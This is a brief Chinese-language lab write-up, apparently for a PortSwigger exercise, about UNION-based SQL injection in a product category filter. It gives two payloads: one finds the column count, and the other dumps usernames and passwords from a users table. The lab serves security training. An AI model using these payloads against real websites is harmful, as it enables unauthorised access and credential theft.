确定产品分类处存在sql注入

pyload:

```javascript
'union+select+null,null--+
```

确定数据表有两列



payload:

```javascript
'union+select+username,password+from+users--+
```

返回users表内容：

![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/portswigger-labs/SQL/images/31EB011A8BA9448F8259A6D94F54A07Dclipboard.png)

